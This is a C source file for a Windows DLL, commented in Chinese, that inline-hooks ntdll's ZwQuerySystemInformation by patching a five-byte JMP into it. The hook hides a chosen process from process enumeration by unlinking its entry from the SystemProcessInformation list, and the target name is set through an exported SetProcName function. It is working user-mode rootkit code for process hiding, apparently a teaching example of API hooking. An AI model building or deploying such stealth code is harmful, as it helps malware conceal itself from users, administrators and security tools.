#include "windows.h"
#include "tchar.h"

#define STATUS_SUCCESS						(0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	PVOID Reserved2[3];
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFORMATION)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
PVOID SystemInformation,
ULONG SystemInformationLength,
PULONG ReturnLength);

#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")


// global variable (in sharing memory)
#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()

// global variable
BYTE g_pOrgBytes[5] = { 0, };

/*
szDllName dll名称
szFuncName  API名称
pfnNew    自己的API的地址
缓存五个字节
*/
BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pfnOrg;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
	PBYTE pByte;

	// 获取ZwQuerySystemInformation地址
	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;

	// 判断第一个字节是否已被修改
	if (pByte[0] == 0xE9)
		return FALSE;

	// 修改内存属性 前额五个字节为可写
	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 保存修改之前的五个字节
	memcpy(pOrgBytes, pfnOrg, 5);

	// JMP 的地址

	dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	// 修改五个字节
	memcpy(pfnOrg, pBuf, 5);

	// 恢复内存属性
	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	// 获取api地址
	pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;

	//判断是否挂钩
	if (pByte[0] != 0xE9)
		return FALSE;

	// 修改内存属性
	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 卸掉钩子
	memcpy(pFunc, pOrgBytes, 5);

	// 还原内存属性
	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
	char szProcName[MAX_PATH] = { 0, };

	// 先脱钩
	unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);

	// o调用kernrl的ZwQuerySystemInformation

	pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),
		DEF_ZWQUERYSYSTEMINFORMATION);
	
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
		(SystemInformationClass, SystemInformation,
		SystemInformationLength, ReturnLength);

	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;
		
	// 对 SystemProcessInformation 操作 
	if (SystemInformationClass == SystemProcessInformation)
	{
		// SYSTEM_PROCESS_INFORMATION类型强转
		// pCur 为单链表的头节点
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while (TRUE)
		{
			// 比较进程名称
			// g_szProcName = 要隐藏的进程名称
			if (pCur->Reserved2[1] != NULL)
			{
				if (!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
				{
					// 删除隐藏进程的节点
					if (pCur->NextEntryOffset == 0)
						pPrev->NextEntryOffset = 0;
					else
						pPrev->NextEntryOffset += pCur->NextEntryOffset;
				}
				else
					pPrev = pCur;
			}

			if (pCur->NextEntryOffset == 0)
				break;

			//指向链表的下一项
			pCur = (PSYSTEM_PROCESS_INFORMATION)
				((ULONG)pCur + pCur->NextEntryOffset);
		}
	}

__NTQUERYSYSTEMINFORMATION_END:

	// 二次勾取api
	hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
		(PROC)NewZwQuerySystemInformation, g_pOrgBytes);

	return status;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{


	switch (fdwReason)
	{
		// #2. API Hooking
	case DLL_PROCESS_ATTACH:
		hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
			(PROC)NewZwQuerySystemInformation, g_pOrgBytes);
		break;

		// #3. API Unhooking 
	case DLL_PROCESS_DETACH:
		unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
			g_pOrgBytes);
		break;
	}

	return TRUE;
}


#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void SetProcName(LPCTSTR szProcName)
	{
		_tcscpy_s(g_szProcName, szProcName);
	}
#ifdef __cplusplus
}
#endif